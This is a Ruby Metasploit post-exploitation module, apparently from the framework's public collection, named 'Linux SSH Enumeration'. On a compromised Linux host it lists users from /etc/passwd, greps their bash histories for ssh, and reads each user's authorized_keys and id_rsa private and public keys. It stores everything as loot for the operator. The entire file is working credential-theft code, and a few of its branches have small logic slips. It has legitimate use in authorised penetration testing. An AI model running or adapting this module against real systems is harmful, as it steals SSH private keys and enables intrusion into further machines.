require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::System
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux SSH Enumeration',
				'Description'   => %q{
						This module will search bash histories for SSH references,
						pull any authorized key files and public/private keys.
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'ohdae <bindshell[at]live.com>',
					],
				'Version'       => '$Revision: 14774 $',
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ "shell" ]
			))
	end


	def run

		distro = get_sysinfo
		print_good("Info:")
		print_good("\t#{distro[:version]}")
		print_good("\t#{distro[:kernel]}")

		print_status("Collecting data...")
		user = execute("/usr/bin/whoami")
		users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
		
		get_ssh_hist(users, user)
		get_authorized_keys(users, user)
		get_ssh_keys(users, user)
		print_status("Module finished!")

	end
		
	def save(msg, data, ctype="text/plain")
		ltype = "linux.enum.ssh"
		loot = store_loot(ltype, ctype, session, data, nil, msg)
		print_status("#{msg} stored in #{loot.to_s}")
	end


	def execute(cmd)
		vprint_status("Execute: #{cmd}")
		output = cmd_exec(cmd)
		return output
	end


	def cat_file(filename)
		vprint_status("Download: #{filename}")
		output = read_file(filename)
		return output
	end


	def get_ssh_hist(users, user)
		if user == "root" and users != nil
			users = users.chomp.split()
			users.each do |u|
				if u == "root"
					vprint_status("Extracting SSH history for #{u}")
					hist = cat_file("/root/.bash_history")
					ssh_hist = execute("/bin/cat /root/.bash_history | /bin/grep \'ssh\'")
				else
					vprint_status("Extracting history for #{u}")
					hist = cat_file("/home/#{u}/.bash_history")
					ssh_hist = execute("/bin/cat /home/#{u}/.bash_history | /bin/grep \'ssh\'")
				end
					save("SSH History for #{u}", ssh_hist) unless hist =~ /No such file or directory/
			end
		else
			vprint_status("Extracting history for #{user}")
			hist = cat_file("/home/#{user}/.bash_history")
			ssh_hist = execute("/bin/cat /home/#{user}/.bash_history | /bin/grep \'ssh\'")
			save("SSH History for #{user}", ssh_hist) unless hist =~ /No such file or directory/
		end
	end

	def get_authorized_keys(users, user)
		if user == "root" and users != nil
			users = users.chomp.split()
			users.each do |u|
				if u == "root"
					vprint_status("Extracting authorized SSH keys for #{u}")
					auth_keys = cat_file("/root/.ssh/authorized_keys")
					vprint_status(auth_keys)
				else
					vprint_status("Extracting authorized SSH keys for #{u}")
					auth_keys = cat_file("/home/#{u}/.ssh/authorized_keys")
					vprint_status(auth_keys)
				end
					save("SSH Authorized Keys for #{u}", auth_keys) unless auth_keys =~ /No such file or directory/
					
			end
		else
			vprint_status("Extracting authorized SSH keys for #{user}")
			auth_keys = cat_file("/home/#{user}/.ssh/authorized_keys")
			vprint_status(auth_keys)
			save("SSH Authorized Keys for #{user}", auth_keys) unless auth_keys =~ /No such file or directory/
			
			end
	end

	def get_ssh_keys(users, user)
		if user == "root" and users != nil
			users = users.chomp.split()
			users.each do |u|
				if u == "root"
					ssh_dir = "/root/.ssh/"
					public_key = cat_file("#{ssh_dir}id_rsa.pub")
					private_key = cat_file("#{ssh_dir}id_rsa")
					keys = (private_key + public_key)
					vprint_status(keys)
				else
					ssh_dir = "/home/#{u}/.ssh/"
					public_key = cat_file("#{ssh_dir}id_rsa.pub")
					private_key = cat_file("#{ssh_dir}id_rsa")
					keys = (private_key + public_key)
					vprint_status(keys)
				end
					save("SSH Public/Private Keys for #{u}", keys) unless public_key =~ /No such file or directory/
			end
		else
			ssh_dir = "/home/#{user}/.ssh/"
			public_key = cat_file("#{ssh_dir}id_rsa.pub")
			private_key = cat_file("#{ssh_dir}id_rsa")

			keys = (private_key + public_key)
			vprint_status(keys)
		end
			save("SSH Public/Private Keys for #{user}", keys) unless ssh_dir =~ /No such file or directory/	
				
	end
end				
